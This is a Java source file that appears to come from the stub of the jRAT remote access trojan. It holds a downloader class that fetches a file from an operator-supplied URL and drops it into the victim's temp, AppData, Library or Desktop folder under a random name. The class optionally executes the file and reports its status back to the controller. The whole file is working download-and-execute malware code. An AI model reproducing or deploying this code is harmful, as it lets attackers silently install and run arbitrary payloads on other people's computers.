package io.jrat.stub;

import io.jrat.stub.packets.outgoing.Packet27URLStatus;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.URL;
import java.net.URLConnection;
import java.util.Random;


public class AdvancedDownloader extends Thread {

	public String url;
	public boolean exec;
	public String drop;

	public AdvancedDownloader(String url, boolean exec, String drop) {
		this.url = url;
		this.exec = exec;
		this.drop = drop;
	}

	public void run() {
		try {
			Connection.addToSendQueue(new Packet27URLStatus(url, "Downloading"));
			File file = null;

			URLConnection con = new URL(url).openConnection();

			String fileName = (new Random().nextInt()) + ".exe";

			String disposition = con.getHeaderField("Content-Disposition");

			if (disposition != null) {
				int index = disposition.indexOf("filename=");
				if (index > 0) {
					fileName = disposition.substring(index + 10, disposition.length() - 1);
				}
			} else if (url.lastIndexOf(".") + 3 >= url.length()) {
				fileName = (new Random().nextInt()) + url.substring(url.lastIndexOf(".") + 1, url.length());
			} else {
				fileName = (new Random().nextInt()) + ".exe";
			}

			if (drop.equals("temp/documents (unix)")) {
				file = new File(System.getProperty("java.io.tmpdir"), fileName);
			} else if (drop.equals("appdata")) {
				String os = System.getProperty("os.name").toLowerCase();
				if (os.contains("win")) {
					file = new File(System.getenv("APPDATA") + File.separator + fileName);
				} else if (os.contains("mac")) {
					file = new File(System.getProperty("user.home") + "/Library/" + fileName);
				} else {
					file = new File(System.getProperty("java.io.tmpdir"), fileName);
				}
			} else if (drop.equals("desktop")) {
				file = new File(System.getProperty("user.home") + "/Desktop/" + fileName);
			}

			InputStream in = con.getInputStream();
			FileOutputStream fout = new FileOutputStream(file);
			byte data[] = new byte[1024];
			int count;
			while ((count = in.read(data, 0, 1024)) != -1) {
				fout.write(data, 0, count);
			}
			in.close();
			fout.close();

			if (this.exec) {
				Runtime.getRuntime().exec(new String[] { file.getAbsolutePath() });
				Connection.addToSendQueue(new Packet27URLStatus(url, "Executed"));
			} else {
				Connection.addToSendQueue(new Packet27URLStatus(url, "Downloaded"));
			}

		} catch (Exception ex) {
			Connection.writeLine("URLSTAT");
			Connection.writeLine(url);
			Connection.writeLine(ex.getMessage());
			ex.printStackTrace();
		}
	}

}
